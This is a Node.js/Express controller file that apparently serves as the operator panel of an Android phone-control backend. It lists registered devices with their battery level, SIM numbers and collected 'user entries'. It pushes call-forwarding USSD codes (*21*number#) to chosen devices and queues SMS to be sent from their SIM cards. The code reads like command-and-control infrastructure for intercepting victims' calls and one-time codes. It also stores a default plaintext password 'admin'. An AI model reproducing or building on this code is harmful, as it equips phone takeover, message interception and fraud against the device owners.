// controllers/devicecontroller.js
const mongoose = require('mongoose');
const Device = require('../models/Device');
const Call = require('../models/Call');
const Battery = require('../models/Battery');
const SimInfo = require('../models/SimInfo');
const User = require('../models/User');
const SmsMessage = require('../models/SmsMessage');
const DeletePass = require('../models/DeletePass');

exports.addDeviceDetails = async (req, res) => {
  try {
    const { model, manufacturer, androidVersion, brand, simOperator } = req.body;
    if (!model || !manufacturer || !androidVersion || !brand || !simOperator) {
      return res.status(400).json({ success: false, error: "All fields are required!" });
    }
    const newDevice = new Device({ model, manufacturer, androidVersion, brand, simOperator });
    await newDevice.save();
    res.status(201).json({
      success: true,
      message: "Device registered successfully!",
      uniqueid: newDevice._id
    });
  } catch (err) {
    res.status(500).json({ success: false, error: "Server Error" });
  }
};

exports.getAllDevicesData = async (req, res) => {
  try {
    // 1. Fetch devices, include androidVersion, brand, _id, createdAt
    const devices = await Device.find({}, 'brand androidVersion _id createdAt')
                                .sort({ createdAt: -1 });

    // 2. Fetch battery statuses
    const batteryStatuses = await Battery.find({}, 'uniqueid batteryLevel connectivity');

    // 3. Fetch user data
    const userDocs = await User.find({}, 'uniqueid entries');

    // 4. Map uniqueid → user entries
    const userMap = {};
    userDocs.forEach(doc => userMap[doc.uniqueid] = doc.entries);

    // 5. Merge into one array including androidVersion
    const devicesWithBattery = devices.map(device => {
      const battery = batteryStatuses.find(
        b => b.uniqueid?.toString() === device._id.toString()
      );
      return {
        _id: device._id,
        uniqueid: device._id,
        brand: device.brand,
        androidVersion: device.androidVersion || 'N/A',
        batteryLevel: battery ? battery.batteryLevel : 'N/A',
        connectivity: battery ? battery.connectivity : 'Offline',
        userEntries: userMap[device._id.toString()] || [],
        createdAt: device.createdAt
      };
    });

    // 6. Render the page with updated data
    res.render('phone', { users: devicesWithBattery });
  } catch (err) {
    console.error('Error in getAllDevicesData:', err);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
};


exports.getDeviceDetails = async (req, res) => {
  try {
    const device_id = req.params.id;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid Device ID" });
    }

    const device = await Device.findById(device_id);
    if (!device) {
      return res.status(404).json({ success: false, error: "Device not found" });
    }

    const simInfo = await SimInfo.findOne({ uniqueid: device_id });
    const sim1Number = simInfo?.sim1Number || "N/A";
    const sim2Number = simInfo?.sim2Number || "N/A";

    // --- PASS uniqueid into the template ---
    res.render('final', { 
      device,
      sim1Number,
      sim2Number,
      uniqueid: device._id.toString()
    });

  } catch (err) {
    console.error("Error fetching device details:", err);
    res.status(500).json({ success: false, error: "Server Error" });
  }
};

// Stop Call Forwarding (Update Same Document)
exports.stopCallForwarding = async (req, res) => {
    try {
        const device_id = req.params.id;
        const { sim } = req.body; // Expecting "SIM 1" or "SIM 2"

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }
        if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        // Stop call forwarding (Ensure single document update)
        const updatedCall = await Call.findOneAndUpdate(
            { call_id: device_id }, // Ensure single document per device
            { 
                sim: sim, // Update SIM field
                code: "##21#",  // Stop forwarding
                updatedAt: new Date()
            },
            { upsert: true, new: true }
        );

        console.log("Stop Call Forwarding updated document:", updatedCall);
        res.redirect(`/api/device/admin/phone/${device_id}`);
    } catch (error) {
        console.error("Error in stopCallForwarding:", error);
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

// Start Call Forwarding (Update Instead of Creating New)
exports.setCallForwarding = async (req, res) => {
    try {
        const { phoneNumber, sim } = req.body; // Expecting "SIM 1" or "SIM 2"
        const device_id = req.params.id;

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }
        if (!/^\d{10}$/.test(phoneNumber)) {
            return res.status(400).json({ success: false, error: "Invalid phone number format" });
        }
        if (!sim || !["SIM 1", "SIM 2"].includes(sim)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        const activationCode = `*21*${phoneNumber}#`;

        // Save or update call forwarding details (Ensure single document)
        const updatedCall = await Call.findOneAndUpdate(
            { call_id: device_id }, // Ensure single document
            { 
                sim: sim, // Update SIM field
                code: activationCode, // Set call forwarding code
                updatedAt: new Date()
            },
            { upsert: true, new: true }
        );

        console.log("Set Call Forwarding updated document:", updatedCall);
        res.redirect(`/api/device/admin/phone/${device_id}`);
    } catch (error) {
        console.error("Error in setCallForwarding:", error);
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

// Get Call Forwarding Status
exports.getCallForwardingStatus = async (req, res) => {
    try {
        const device_id = req.params.id;
        let simParam = req.query.sim; // Expecting "SIM 1" or "SIM 2"

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, message: "Invalid Device ID", code: null });
        }
        if (simParam && !["SIM 1", "SIM 2"].includes(simParam)) {
            return res.status(400).json({ success: false, error: "Invalid SIM selection" });
        }

        let query = { call_id: device_id };
        
        if (simParam) {
            query.sim = simParam;
        }

        const callData = await Call.findOne(query).select("code sim");
        if (!callData) {
            return res.status(404).json({ success: false, message: "No call forwarding set for this device", code: null });
        }

        res.status(200).json({
            success: true,
            message: "Call forwarding details fetched successfully",
            code: callData.code,
            sim: callData.sim
        });
    } catch (error) {
        console.error("Error fetching call forwarding status:", error);
        res.status(500).json({ success: false, message: "Internal Server Error", code: null });
    }
};

exports.sendSms = async (req, res) => {
  try {
    const { simSlot, toNumber, message } = req.body;
    const device_id = req.params.id;

    if (!mongoose.isValidObjectId(device_id)) {
      return res.status(400).json({ success: false, error: "Invalid device ID" });
    }

    if (!toNumber || !message || !simSlot) {
      return res.status(400).json({ success: false, error: "All fields are required" });
    }

    // Optional: validate phone number format
    if (!/^\d{10,15}$/.test(toNumber)) {
      return res.status(400).json({ success: false, error: "Invalid phone number" });
    }

    const newSms = new SmsMessage({
      uniqueid: device_id,
      simSlot,
      toNumber,
      message,
    });

    // Log the SMS data to console
    console.log('Saving SMS message:', newSms);

    await newSms.save();
    res.redirect(`/api/device/admin/phone/${device_id}`);
  } catch (err) {
    console.error('Error sending SMS:', err);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
};

exports.deleteDevice = async (req, res) => {
  const { id } = req.params;
  const { password } = req.body;

  try {
    // Ensure a DeletePass record exists. If not, insert default.
    let passDoc = await DeletePass.findOne();
    if (!passDoc) {
      passDoc = await DeletePass.create({ password: 'admin' });
    }

    // Validate password
    if (password !== passDoc.password) {
      return res.status(401).json({ error: 'Invalid password' });
    }

    // Proceed to delete device
    const deleted = await Device.findByIdAndDelete(id);
    if (!deleted) {
      return res.status(404).json({ error: 'Device not found' });
    }

    return res.json({ message: 'Device deleted successfully' });
  } catch (err) {
    console.error('Delete error:', err);
    return res.status(500).json({ error: 'Server error' });
  }
};

exports.updateDeletePassword = async (req, res) => {
  const { oldPassword, newPassword } = req.body;

  if (!oldPassword || !newPassword) {
    return res.status(400).json({ success: false, error: 'Both passwords required' });
  }

  try {
    const passDoc = await DeletePass.findOne();
    if (!passDoc || passDoc.password !== oldPassword) {
      return res.status(401).json({ success: false, error: 'Incorrect old password' });
    }

    passDoc.password = newPassword;
    await passDoc.save();

    return res.json({ success: true, message: 'Password updated' });
  } catch (err) {
    console.error('Password update error:', err);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
};
